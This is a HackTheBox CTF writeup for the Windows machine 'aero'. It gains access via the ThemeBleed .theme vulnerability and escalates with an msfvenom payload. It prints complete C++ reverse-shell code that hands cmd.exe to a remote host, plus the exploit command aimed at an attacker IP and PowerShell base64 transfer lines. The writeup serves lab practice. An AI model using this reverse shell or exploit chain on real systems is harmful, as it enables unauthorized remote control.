---
title: "aero"
date: 2026-01-26
draft: false
description: "HackTheBox aero writeup"
tags: ["hackthebox", "htb", "windows", "medium", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# aero

## Overview

- **OS:** Windows
- **IP:** 10.129.1.73
- **Difficulty:** Medium
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Got initial access using a exploit.theme file, elevated privs with buffer overflow privesc vuln.

## Loot

| **Takeaways** |  |
| --- | --- |
| **Category** | **Details** |
| Usernames+Passwords |  |
| Hashes |  |

## Enumeration
- **nmap**

{{< figure src="image 323.png" >}}

- 80


Place where we can upload a .theme file

{{< figure src="image 324.png" >}}

## Exploitation


Knowing that we are able to upload theme files lets check if there is any vulnerability that works with this

{{< figure src="image 325.png" >}}

this looks interesting, lets try it out

Lets use visual studio to craft our rev shell in C

{{< figure src="image 326.png" >}}

{{< figure src="image 327.png" >}}

Lets add a new header file in the solution explorer, named rev.h

`#pragma once

extern "C" __declspec(dllexport) int VerifyThemeVersion(void);`

lets add rev.cpp aswell

```
    #include "pch.h"
    #include <stdio.h>
    #include <string.h>
    #include <process.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <stdlib.h>
    #pragma comment(lib, "Ws2_32.lib")
    #include "rev.h"
    using namespace std;
    
    void rev_shell()
    {
        FreeConsole();
    
        const char* REMOTE_ADDR = "127.0.0.1";
        const char* REMOTE_PORT = "4444";
    
        WSADATA wsaData;
        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        struct addrinfo* result = NULL, * ptr = NULL, hints;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
        ptr = result;
        SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
        connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = (HANDLE)ConnectSocket;
        si.hStdOutput = (HANDLE)ConnectSocket;
        si.hStdError = (HANDLE)ConnectSocket;
        TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        WSACleanup();
    }
    
    int VerifyThemeVersion(void)
    {
        rev_shell();
        return 0;
```

now lets set it to release and go build and then build wsolution

{{< figure src="image 328.png" >}}

after copying it over to stage 3 we will generate over theme file

`.\ThemeBleed.exe make_theme 10.10.14.6 exploit.theme`

Ok so scratch all that, despite trying several times i wasnt able to run the exploit, maybe because it is meant for windows, so lets try this guys instead.

[https://github.com/Jnnshschl/CVE-2023-38146](https://github.com/Jnnshschl/CVE-2023-38146)

{{< figure src="image 329.png" >}}

and we get our rev shell on the listener so easily with this

{{< figure src="image 330.png" >}}

we find some cve pdf lets use this to encode and decode it

[convert]::ToBase64String((Get-Content -path "filename" -Encoding byte))

[System.IO.File]::WriteAllBytes("C:\Users\..\Desktop\abcd.pdf" , [System.Convert]::FromBase64String("Base64 encoded string"))

{{< figure src="image 331.png" >}}

Found a precompiled binary of this exploit online, generated revshell.exe w msfvenom and then just ran it to get the rev shell

{{< figure src="image 332.png" >}}
